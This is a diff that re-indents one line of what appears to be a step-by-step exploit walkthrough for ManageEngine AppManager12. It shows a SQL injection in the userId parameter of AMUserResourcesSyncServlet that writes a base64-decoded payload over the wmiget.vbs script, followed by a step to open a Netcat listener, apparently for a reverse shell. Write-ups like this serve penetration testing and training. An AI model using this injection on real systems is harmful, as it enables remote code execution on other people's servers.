@@ -41,7 +41,7 @@ Match and replace roles in Notepad++ (to make the payload oneliner):
   - write it to to `wmiget.vbs` using `copy (select convert_from(decode($$ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;`
   - Final SQLI query looks like this:
     ```
-/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;copy (select convert_from(decode($$ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
+    /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;copy (select convert_from(decode($$ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
     ```
   - change request method to POST and send the request
 5. **Open a Netcat listener**
